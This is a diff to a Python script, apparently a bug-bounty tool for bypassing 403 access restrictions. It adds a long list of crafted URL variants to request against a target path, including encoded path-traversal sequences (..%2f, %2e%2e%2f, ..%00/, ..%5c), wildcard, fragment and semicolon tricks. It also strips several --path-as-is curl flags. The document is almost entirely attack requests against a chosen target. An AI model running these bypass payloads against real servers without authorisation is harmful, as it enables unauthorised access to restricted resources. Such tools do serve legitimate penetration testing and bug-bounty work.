@@ -148,33 +148,86 @@ def main():
 		print(bcolors.OK+"[+]"+bcolors.RESET+"Try bypass with"+bcolors.OK+" Bug Bounty Tricks"+bcolors.RESET)
 		print("\n")
 		####################Début des tests (Tips)###############################
+		test=target+"/"+uri+"/*"
+		print("Response ending with /*: ",curl_fct(" -X GET",test))
+		test=target+"/"+uri+"./."
+		print("Response ending with ./.: ",curl_fct(" -X GET",test))
+		test=target+"/"+uri+"/*/"
+		print("Response ending with /*/.: ",curl_fct(" -X GET",test))
+		test=target+"/"+uri+"&"
+		print("Response ending with &: ",curl_fct(" -X GET",test))
+		test=target+"/"+uri+"#"
+		print("Response ending with '#': ",curl_fct(" -X GET",test))
+		test=target+"/"+uri+"%"
+		print("Response ending with %: ",curl_fct(" -X GET",test))
+		test=target+"/"+uri+"%09"
+		print("Response ending with %09: ",curl_fct(" -X GET",test))
+		test=target+"/"+uri+"../"
+		print("Response ending with ../: ",curl_fct(" -X GET",test))
+		test=target+"/"+uri+"..%2f"
+		print("Response ending with ..%2f: ",curl_fct(" -X GET",test))
+		test=target+"/"+uri+".././"
+		print("Response ending with .././: ",curl_fct(" -X GET",test))
+		test=target+"/"+uri+"..%00/"
+		print("Response ending with ..%00/: ",curl_fct(" -X GET",test))
+		test=target+"/"+uri+"..%0d"
+		print("Response ending with ..%0d: ",curl_fct(" -X GET",test))
+		test=target+"/"+uri+"..%5c"
+		print("Response ending with ..%5c: ",curl_fct(" -X GET",test))
+		test=target+"/"+uri+"..%ff/"
+		print("Response ending with ..%ff/: ",curl_fct(" -X GET",test))
+		test=target+"/"+uri+"%2e%2e%2f"
+		print("Response ending with %2e%2e%2f: ",curl_fct(" -X GET",test))
+		test=target+"/"+uri+".%2e/"
+		print("Response ending with .%2e/: ",curl_fct(" -X GET",test))
+		test=target+"/"+uri+"%3f"
+		print("Response ending with %3f: ",curl_fct(" -X GET",test))
+		test=target+"/"+uri+"%26"
+		print("Response ending with %26: ",curl_fct(" -X GET",test))
+		test=target+"/"+uri+"%23"
+		print("Response ending with %23: ",curl_fct(" -X GET",test))
+		test=target+"/"+uri+".json"
+		print("Response trying to open in json file: ",curl_fct(" -X GET",test))
+		test=target+"/*"+uri
+		print("Response with /* between: ",curl_fct(" -X GET",test))
+		test=target+"./."+uri
+		print("Response with ./. between : ",curl_fct(" -X GET",test))
+		test=target+"/*/"+uri
+		print("Response with /*/ between : ",curl_fct(" -X GET",test))
+		test=target+"?"+uri
+		print("Response with ? between : ",curl_fct(" -X GET",test))
+		test=target+"??"+uri
+		print("Response with ?? between : ",curl_fct(" -X GET",test))
+		test=target+"#"+uri
+		print("Response with '#' between : ",curl_fct(" -X GET",test))
 		test=target+"/%2e/"+uri
 		print("Response with /%2e/ between: ",curl_fct(" -X GET",test))
 		test=target+"/"+uri+"/."
-		print("Response ending with /. : ",curl_fct(" -X GET --path-as-is",test))
+		print("Response ending with /. : ",curl_fct(" -X GET",test))
+		test=target+"/"+uri+"?"		
 		print("Response ending with ?: ",curl_fct(" -X GET",test))
 		test=target+"/"+uri+"??"
 		print("Response ending with ??: ",curl_fct(" -X GET",test))
 		test=target+"/"+uri+"//"
 		print("Response ending with //: ",curl_fct(" -X GET",test))
 		test=target+"/./"+uri+"/./"
-		print("Response beween and ending with /./ : ",curl_fct(" -X GET --path-as-is",test))
+		print("Response beween and ending with /./ : ",curl_fct(" -X GET",test))
 		test=target+"/"+uri+"/"
 		print("Response ending with /: ",curl_fct(" -X GET",test))
 		test=target+"/"+uri+"/.string"
 		print("Response ending with .string: ",curl_fct(" -X GET",test))
 		test=target+"/"+uri+"..\;/"
-		print("Response ending with ..; : ",curl_fct(" -X GET --path-as-is",test))
+		print("Response ending with ..; : ",curl_fct(" -X GET",test))
 		test=target+"/.\;/"+uri
-		print("Response with /.;/ between: ",curl_fct(" -X GET --path-as-is",test))
+		print("Response with /.;/ between: ",curl_fct(" -X GET",test))
 		test=target+"\;foo=bar/"+uri
-		print("Response  with ;foo=bar;/ between: ",curl_fct(" -X GET --path-as-is",test))
+		print("Response  with ;foo=bar;/ between: ",curl_fct(" -X GET",test))
 		test=target+"/%20"+uri+"%20/"
-		print("Response with %20 between: ",curl_fct(" -X GET --path-as-is",test))
+		print("Response with %20 between: ",curl_fct(" -X GET",test))
 		test=target+uri+"%20/"
 		print("Response ending with %20/:",curl_fct(" -X GET",test))
 		stop=time.time()
-		Time=stop-start #Arret du chronomètre
+		Time=stop-start
 		print("\n")
 		####################Fin des tests (Tips)###############################
 		
